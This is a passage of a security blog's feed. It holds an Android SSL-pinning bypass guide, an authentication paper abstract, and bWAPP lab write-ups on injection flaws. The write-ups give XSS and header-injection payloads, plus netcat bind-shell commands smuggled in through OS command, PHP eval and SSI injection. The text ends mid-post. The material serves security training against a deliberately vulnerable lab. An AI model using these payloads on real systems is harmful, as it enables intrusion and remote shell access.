+        <content type="html"><![CDATA[<h3 id="Why-SSL-pinning"><a href="#Why-SSL-pinning" class="headerlink" title="Why SSL pinning?"></a>Why SSL pinning?</h3><p>SSL Pinning is where you ignore that whole thing, and say trust this certificate only or perhaps trust only certificates which are signed by this CA. </p><h3 id="Ways-to-bypass-android-ssl-verification-certificate-pinning"><a href="#Ways-to-bypass-android-ssl-verification-certificate-pinning" class="headerlink" title="Ways to bypass android ssl verification certificate pinning"></a>Ways to bypass android ssl verification certificate pinning</h3><ol><li>Adding a Custom CA to the User Certificate Store</li><li>Overwrite Packaged CA Certificate with Custom CA Certificate</li><li>Frida Hook</li><li>Reversing Custom Certificate Validation Code</li></ol><h3 id="Method-used"><a href="#Method-used" class="headerlink" title="Method used"></a>Method used</h3><p>Xposed framework is somewhat similar to technique 3 - Frida framework, both the method allows tampering with an application’s code at runtime. The Xposed framework requires root privilege, but Frida gains access to the full suite of Frida functionality without rooting a device. </p><p>In this process, the device used is nexus 6p and Hardware Info about this device which is useful when installing the Xposed framework.</p><p><img src="/medias/projects/ssl/hinfo.png" alt="Hard info"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>Android version is oreo 8.0. I used magisk to root the device and can’t root the device using SuperSU latest version leads to bootloop for this version of this device.</p><p>Choose SuperSu or Magisk based on the usage. SuperSU changes the system files and adds new files to the system partition on the phone and Magisk is called a “systemless” root because it doesn’t touch any of those system files.</p><p><img src="/medias/projects/ssl/root.png" alt="root info"></p><h3 id="Xposed-Framework-Installation"><a href="#Xposed-Framework-Installation" class="headerlink" title="Xposed Framework Installation"></a>Xposed Framework Installation</h3><p>Install the xposed framework based on the device android version(SDK 26) and instruction sets(arm64).</p><p><img src="/medias/projects/ssl/xp1.png" alt="xposed sdk"><br><img src="/medias/projects/ssl/xp2.png" alt="xposed arm"><br><img src="/medias/projects/ssl/xp3.png" alt="xposed version"></p><p>I prefer manual flashing using recovery mode.</p><p>Install xposed apk 3.1 and grant a root privilege using magisk.</p><p><img src="/medias/projects/ssl/rtxp.png" alt="xposed root"><br><img src="/medias/projects/ssl/xp4.png" alt="xposed apk"></p><h3 id="SSLUnpinning-2-0-module"><a href="#SSLUnpinning-2-0-module" class="headerlink" title="SSLUnpinning 2.0 module"></a>SSLUnpinning 2.0 module</h3><p>Now, SSLUnpinning 2.0 module can be installed from xposed framework.</p><p><img src="/medias/projects/ssl/ssl.png" alt="ssl unpin"></p><p>Soft reboot, To activate the module and list of apps can be seen in SSLUnpinning application. Choose the target application and unpin that.</p><p><img src="/medias/projects/ssl/sslapp.png" alt="app list"></p><h3 id="Configuring-BurpSuite"><a href="#Configuring-BurpSuite" class="headerlink" title="Configuring BurpSuite"></a>Configuring BurpSuite</h3><p>Now, for MITM configure the burpsuite with the interface as its own IP and the port number as 8082(for ex). Connect the target android phone in the same network and set manual proxy to burpsuite pc’s ip and port as below</p><p><img src="/medias/projects/ssl/burp.png" alt="network mod"></p><p>Now the targeted app, establish the connection and https packets can be captured.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Android </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Mobile </tag>
+            
+            <tag> Bypass </tag>
+            
+            <tag> Xposed </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION</title>
+      <link href="Paper/Project/multi-factor/"/>
+      <url>Paper/Project/multi-factor/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>Multi-factor authentication schemes have emerged as alternatives to single-factor authentication schemes with the aim<br>of improving the security. Factors like passwords, biometrics smart/id cards have been used in combinations in addition to mobile OTPs for enhancing security. Conventional authentication schemes are inadequate for security-critical applications like financial transaction, online examinations,etc. The paper focuses on discussing a multi-factor authentication scheme specifically designed for securing online examination services without comprising user-friendliness. The experimentation results clearly brought out the applicability of the scheme in real time with fine-tuning of network related parameters.</p><p><img src="/medias/projects/multi/flow.png" alt="Flow chart"></p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>Modules used :<ul><li>Face Recognition modules</li><li>OTP Module</li><li>Fingerprint Module</li></ul></li><li>Mitigating different forms of attacks.</li><li>User-friendly</li></ul><p>This paper was published in <a href="https://acadpubl.eu/hub/2018-119-15/4/783.pdf">International Journal of Pure and Applied Mathematics</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Paper </category>
+          
+          <category> Project </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> Paper </tag>
+            
+            <tag> Project </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP IFrame and SMTP Injection</title>
+      <link href="Writeups/bwapp-iframe-smtp/"/>
+      <url>Writeups/bwapp-iframe-smtp/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="IFrame-Injection"><a href="#IFrame-Injection" class="headerlink" title="IFrame Injection:"></a>IFrame Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>By viewing the source code page, construct the payload accordingly.</p><p>payloads to be used are,</p><pre><code>localhost/bwapp/iframei.php?ParamUrl=https://www.mukhilan.com&amp;ParamWidth=250"&amp;ParamHeight=250localhost/bwapp/iframei.php?ParamUrl=javascript:alert(1)&amp;ParamWidth=250%22&amp;ParamHeight=250</code></pre><p>The source code is,</p><pre><code>&lt;iframe frameborder="0" src="&lt;?php echo xss($_GET["ParamUrl"])?&gt;" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>localhost/bwapp/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250%22%3E%3C/iframe%3E%3Cscript%3Ealert(1);%3C/script%3E&amp;ParamHeight=250</code></pre><p>payload is <code>"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code>.<br>Iframe’s last parameter is width. So, Payload should inject after paramWidth.</p><p>The source code is,</p><pre><code>&lt;iframe frameborder="0" src="robots.txt" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre><h2 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP):"></a>Mail Header Injection (SMTP):</h2><p>In this, if the input field in the contact page is not filtered correctly. Then we can add extra content to the SMTP Header as below.</p><p>In mail field, payload can be <code>exp1@exp1.com\r\nCc:exp@exp.com</code> or <code>exp1@exp1.com\r\nbcc:exp@exp.com</code>.</p><p>Check the link in the reference section, Acunetix gave a good explanation of this vulnerability.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.acunetix.com/blog/articles/email-header-injection/https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP OS Command Injection /Blind</title>
+      <link href="Writeups/bwapp-os-injection/"/>
+      <url>Writeups/bwapp-os-injection/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection:"></a>OS Command Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>payloads can be,</p><pre><code>www.mukhilan.com &amp;&amp; lswww.mukhilan.com &amp;&amp; nc -lvp 4444 -e /bin/bash</code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>www.mukhilan.com | lswww.mukhilan.com | nc -lvp 4444 -e /bin/bash</code></pre><p>To get a shell, execute <code>nc -vn *ip* 4444</code>.</p><p>The source code is,</p><pre><code>echo "&lt;p align=\"left\"&gt;" . shell_exec("nslookup  " . commandi($target)) . "&lt;/p&gt;";</code></pre><h2 id="BWAPP-OS-Command-Injection-Blind"><a href="#BWAPP-OS-Command-Injection-Blind" class="headerlink" title="BWAPP OS Command Injection - Blind:"></a>BWAPP OS Command Injection - Blind:</h2><p>In blind os injection, 1st structure the os injection. For that, Header is as below.</p><pre><code>POST /bWAPP/commandi_blind.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://localhost/bWAPP/commandi_blind.phpContent-Type: application/x-www-form-urlencodedContent-Length: 29Cookie: security_level=1; PHPSESSID=0gn1tu251ra9e9nbjqrf2n3v9uConnection: closeUpgrade-Insecure-Requests: 1target=127.0.0.1&amp;form=submit</code></pre><p>In this, there is no field to show the output.So, payload should be as follows.</p><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><pre><code>www.mukhilan.com &amp;&amp; nc -lvp 4444 -e /bin/bash</code></pre><h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>www.mukhilan.com | nc -lvp 4444 -e /bin/bash</code></pre><p>To get a shell, execute <code>nc -vn *ip* 4444</code>.</p><p>The Source code is,</p><pre><code>shell_exec("ping -c 1 " . commandi($target));</code></pre><p>Useful info for payload from owasp,</p><ul><li>cmd1 <code>|</code> cmd2  : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.</li><li>cmd1 <code>;</code> cmd2  : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.</li><li>cmd1 <code>||</code> cmd2  : Command 2 will only be executed if command 1 execution fails.</li><li>cmd1 <code>&amp;&amp;</code> cmd2 : Command 2 will only be executed if command 1 execution succeeds.</li><li>$(cmd) : For example, echo $(whoami) or $(touch test.sh; echo ‘ls’ &gt; test.sh)</li><li>‘cmd’ : It’s used to execute specific command. For example, ‘whoami’</li></ul><p>To prevent,<br>Escape or filter special characters for windows,  <code>( ) &lt; &gt; &amp; * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , `</code><br>Escape or filter special characters for Linux, <code>{ }  ( ) &lt; &gt; &amp; * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , `</code></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP PHP and SSI Injection</title>
+      <link href="Writeups/bwapp-php-ssi/"/>
+      <url>Writeups/bwapp-php-ssi/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection:"></a>PHP Code Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>To check whether its PHP code injectable. phpinfo() function can be used,</p><pre><code>?message=phpinfo()</code></pre><p>System commands also can be executed using PHP.</p><p>For windows,</p><pre><code>?message=1;system('dir')</code></pre><p>For linux,</p><pre><code>?message=1;system('ls')?message=1;system('nc -lvp 4444 -e /bin/bash')</code></pre><p>To get a shell, execute <code>nc -vn *ip* 4444</code>.</p><p>The source code is</p><pre><code>&lt;p&gt;&lt;i&gt;&lt;?php @eval ("echo " . $_REQUEST["message"] . ";");?&gt;&lt;/i&gt;&lt;/p&gt;</code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this case, medium level and high level are same. The source code is </p><pre><code>&lt;p&gt;&lt;i&gt;&lt;?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?&gt;&lt;/i&gt;&lt;/p&gt;</code></pre><h2 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes SSI Injection:"></a>Server-Side Includes SSI Injection:</h2><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>1st check whether <code>&lt; ! # = / . " - &gt; and [a-zA-Z0-9]</code> these characters should take without any sanitization. After that, we can inject some payload.</p><p>Payloads,</p><pre><code>&lt;!--#exec cmd="ls" --&gt;&lt;!--#exec cmd="nc -lvp 8888 -e /bin/bash"--&gt;</code></pre><p>To get a shell, execute <code>nc -nv *ip* 8888</code>. </p><h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this level <code>"</code> this character is geting sanatized. we can check this using a sample input <code>&lt; ! # = / . " - &gt; and [a-zA-Z0-9]</code> and the output is <code>&lt; ! # = / . \" - &gt; And [a-zA-Z0-9]</code>.<br>In which <code>\"</code> doublequote is sanitized to prevent the payload with this character.</p><p>payload,</p><pre><code>&lt;!--#exec cmd=ls --&gt;</code></pre><p>The source code is</p><pre><code>$line = '&lt;p&gt;Hello ' . $firstname . ' ' . $lastname . ',&lt;/p&gt;&lt;p&gt;Your IP address is:' . '&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;';</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009)https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injectionhttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP HTML Injection (Reflected URL/Stored Blog)</title>
+      <link href="Writeups/bwapp-html-2/"/>
+      <url>Writeups/bwapp-html-2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="HTML-Injection-Reflected-URL"><a href="#HTML-Injection-Reflected-URL" class="headerlink" title="HTML Injection - Reflected URL:"></a>HTML Injection - Reflected URL:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>Capture the header with burp suite and manipulate the header to inject the malicious code.</p><p>Burp Suite header</p><pre><code>GET /bWAPP/htmli_current_url.php?&lt;h2&gt;dfbfd&lt;/h2&gt; HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://localhost/bWAPP/htmli_current_url.phpCookie: security_level=0; PHPSESSID=2rbsk7srls24vvk3m5gciudngvConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0</code></pre><p>In this level, there is no sanitization and the source code is</p><pre><code>$url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];               </code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>localhost/bWAPP/htmli_current_url.php#&lt;h2&gt;code injection&lt;/h2&gt;</code></pre><p>Note however, that some browsers may encode the <code>&lt;</code> and <code>&gt;</code> characters in the URL, causing the attack to fail. However there are other scenarios which do not require the use of these characters, nor embedding the code into the URL directly, so these browsers are not entirely immune to this type of attack either.</p><p>So, using IE old version will be a successfull attack and and the source code is</p><pre><code>$url = "&lt;script&gt;document.write(document.URL)&lt;/script&gt;";</code></pre><p>Usually document.url, document.write, document.location comes under DOM XSS, if its not properly handled.<br>For more details about DOM based attacks, refer the first link in reference section.</p><h2 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored Blog:"></a>HTML Injection - Stored Blog:</h2><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>mukhilan.com<span class="token punctuation">'</span></span> <span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>Sample payload,</p><pre class=" language-html"><code class="language-html">&lt;iframe src="robots.txt"+height="200"+width="300"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><p>In this, we can try different payloads like creating a login template and that will redirect to your malicious website which will get the users credentials in URL GET parameter. After that, you can store the credential with a script and redirect the victim to the dashboard page. Like this, we can try a different type of payload.</p><h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In some cases, medium level and high level are the same. In this case,I have used some encoded payloads. It’s Sanatized properly.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.acunetix.com/blog/articles/dom-xss-explained/https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP HTML Injection (GET/POST)</title>
+      <link href="Writeups/bwapp-html/"/>
+      <url>Writeups/bwapp-html/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET):"></a>HTML Injection - Reflected (GET):</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><pre><code>localhost/bWAPP/htmli_get.php?firstname=%3Ca+href%3D%27https%3A%2F%2Fwww.mukhilan.com%2F%27%3Etest%3C%2Fa%3E&amp;lastname=sdf&amp;form=submit</code></pre><p>Sample payload,</p><pre class=" language-html"><code class="language-html">&lt;a+href%3D'https://www.mukhilan.com/'+>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%2Fa</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe+src%3D"robots.txt"+height%3D"200"+width%3D"300"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%2Fiframe</span><span class="token punctuation">></span></span></code></pre><h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>localhost/bWAPP/htmli_get.php?firstname=%253Ch2%253Efgh%253C%252Fh2%253E&amp;lastname=df&amp;form=submit </code></pre><p>In this level, Encoding will bypass the validation. </p><h2 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST):"></a>HTML Injection - Reflected (POST):</h2><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>mukhilan.com<span class="token punctuation">'</span></span> <span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>Sample payload,</p><pre class=" language-html"><code class="language-html">&lt;iframe src="robots.txt"+height="200"+width="300"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>%3Ch2%3Edf%3C%2Fh2%3E</code></pre><p>same as GET medium level , encoding will bypass this level.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/Testing_for_HTML_Injection_(OTG-CLIENT-003)https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeups </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Bwapp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BWAPP XML/XPath Injection (Login Form/search)</title>
+      <link href="Writeups/bwapp-xml-xpath/"/>
+      <url>Writeups/bwapp-xml-xpath/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form):"></a>XML/XPath Injection (Login Form):</h2><p>Sample xml data is as below,</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employees</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Arnold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Baker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>ABaker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>SoSecret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>Admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Peter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Pan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>PPan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>NotTelling<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employees</span><span class="token punctuation">></span></span></code></pre><p>The source code is, </p><pre><code>$xml = simplexml_load_file("passwords/heroes.xml");$result = $xml-&gt;xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");</code></pre><p>To find whether its XML injection or not, its similar to SQL injection. Use single quote <code>'</code> and error shows you XML and XPath is used.</p><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>Here without login password validation, Data can be accessed using <strong>id</strong> in the 